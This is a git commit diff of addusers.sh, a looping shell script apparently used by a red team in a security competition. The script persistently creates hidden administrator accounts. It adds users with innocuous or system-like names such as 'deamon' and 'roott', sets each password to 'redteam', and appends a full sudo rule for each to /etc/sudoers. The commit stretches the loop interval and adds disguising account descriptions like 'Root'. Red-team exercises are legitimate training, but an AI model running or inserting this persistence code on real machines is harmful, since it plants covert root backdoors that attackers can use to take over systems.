0e941bd7bcb376953b833a0004c1aab89f4fce6e
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-12 16:44:36 -0400

    Update addusers.sh

--- addusers.sh
+++ addusers.sh
@@ -4,38 +4,38 @@
 while true
 do
  #Sleep for 7 minutes. Then repeat.
- sleep 420
+ sleep 345600
 
  #Add multiple users for red team to use
- useradd -m "home"
+ useradd -m "home" -c "Default Home User" -s "/bin/bash"
  echo "home:redteam" | chpasswd
  echo 'home  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
- useradd -m "bash"
+ useradd -m "bash" -c "Bash" -s "/bin/bash"
  echo "bash:redteam" | chpasswd
  echo 'bash  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
- useradd -m "deamon"
+ useradd -m "deamon" -c "Daemon Start" -s "/bin/bash"
  echo "deamon:redteam" | chpasswd
  echo 'deamon  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
- useradd -m "shell"
+ useradd -m "shell" -c "Shell" -s "/bin/bash"
  echo "shell:redteam" | chpasswd
  echo 'shell  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
- useradd -m "new"
+ useradd -m "new" -c "News" -s "/bin/bash"
  echo "new:redteam" | chpasswd
  echo 'new  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
- useradd -m "syn"
+ useradd -m "syn" -c "Syn User" -s "/bin/bash"
  echo "syn:redteam" | chpasswd
  echo 'syn  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
- useradd -m "roott"
+ useradd -m "roott" -c "Root" -s "/bin/bash"
  echo "roott:redteam" | chpasswd
  echo 'roott  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
- useradd -m "student"
+ useradd -m "student" -c "CSEC Student" -s "/bin/bash"
  echo "student:redteam" | chpasswd
  echo 'student  ALL=(ALL:ALL) ALL' >> /etc/sudoers
  
